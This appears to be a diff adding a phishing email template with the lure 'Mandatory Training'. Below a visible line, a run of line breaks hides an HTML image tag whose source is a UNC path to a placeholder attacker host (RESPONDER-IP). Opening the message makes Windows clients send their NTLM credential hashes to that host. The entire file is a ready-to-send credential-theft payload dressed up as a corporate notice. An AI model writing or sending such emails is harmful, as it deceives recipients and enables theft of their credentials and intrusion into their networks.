@@ -1,0 +1,10 @@
+from = "no-reply@example.com"
+to = "target@example.com"
+subject = "Mandatory Training"
+mimetype = "text/html"
+
+body = """
+Complete training by this Friday.
+<br><br><br><br><br><br><br><br><br><br>
+<img src="\\\\RESPONDER-IP\\SHARE\\image.png" alt="Corporate Banner" />
+"""
